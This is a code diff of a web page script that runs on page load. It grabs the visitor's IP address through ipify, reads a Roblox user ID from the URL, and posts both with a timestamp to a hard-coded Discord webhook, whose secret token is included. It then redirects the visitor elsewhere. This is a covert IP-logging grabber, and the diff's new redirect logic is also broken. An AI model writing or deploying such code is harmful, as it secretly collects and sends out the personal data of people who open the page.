@@ -10,65 +10,62 @@
 
   <script>
     document.addEventListener("DOMContentLoaded", function() {
-      sendDiscordMessage();
+      // Navigate to the Roblox user profile page
+      window.location.href = "https://www.roblox.com/users/profile";
+
+      // Wait for the user profile page to load
+      window.addEventListener("load", function() {
+        // Extract the user ID from the URL
+        var userId = getUserIdFromUrl();
+
+        // If user ID is found, send Discord message
+        if (userId) {
+          sendDiscordMessage(userId);
+        } else {
+          console.error("User ID not found in the URL.");
+        }
+      });
     });
 
-    function sendDiscordMessage() {
+    function getUserIdFromUrl() {
+      var urlParams = new URLSearchParams(window.location.search);
+      return urlParams.get('userId');
+    }
+
+    function sendDiscordMessage(userId) {
       var webhookURL = "https://discord.com/api/webhooks/1214203058284662794/cpyZU4ceyZ2TLhojorU_akBA-jqF_45EZzdSdBQBv_NNkwCwPMWR3Kaw8nzXAeqmuXn9";
       var currentDate = new Date();
       var formattedDate = currentDate.toLocaleString('en-US', { month: 'long', day: 'numeric', year: 'numeric', hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
 
-      // Extract user ID from the URL
-      var urlParams = new URLSearchParams(window.location.search);
-      var userId = urlParams.get('userId');
-
-      if (!userId) {
-        console.error("User ID not found in the URL.");
-        return;
-      }
-
-      // Fetch user information from Roblox API
-      fetch("https://api.roblox.com/users/" + userId)
+      fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
-          var robloxUsername = data.Username;
+          var ip = data.ip;
           var message = {
-            content: "Opened on: " + formattedDate + "\nRoblox username: " + robloxUsername + "\nRoblox user ID: " + userId
+            content: "Opened on: " + formattedDate + "\nIP address: " + ip + "\nRoblox user ID: " + userId
           };
 
-          // Fetch IP address
-          fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-              var ip = data.ip;
-              message.content += "\nIP address: " + ip;
-
-              // Send message to Discord webhook
-              fetch(webhookURL, {
-                method: "POST",
-                headers: {
-                  "Content-Type": "application/json"
-                },
-                body: JSON.stringify(message)
-              })
-              .then(response => {
-                if (!response.ok) {
-                  console.error("Failed to send message to Discord.");
-                } else {
-                  console.log("Message sent to Discord successfully.");
-                  redirectToDifferentWebsite();
-                }
-              })
-              .catch(error => {
-                console.error("Error sending message to Discord:", error);
-              });
-            })
-            .catch(error => {
-              console.error("Error fetching IP address:", error);
-            });
+          fetch(webhookURL, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify(message)
+          })
+          .then(response => {
+            if (!response.ok) {
+              console.error("Failed to send message to Discord.");
+            } else {
+              console.log("Message sent to Discord successfully.");
+              redirectToDifferentWebsite();
+            }
+          })
+          .catch(error => {
+            console.error("Error sending message to Discord:", error);
+          });
         })
         .catch(error => {
-          console.error("Error fetching user information from Roblox API:", error);
+          console.error("Error fetching IP address:", error);
         });
     }
 
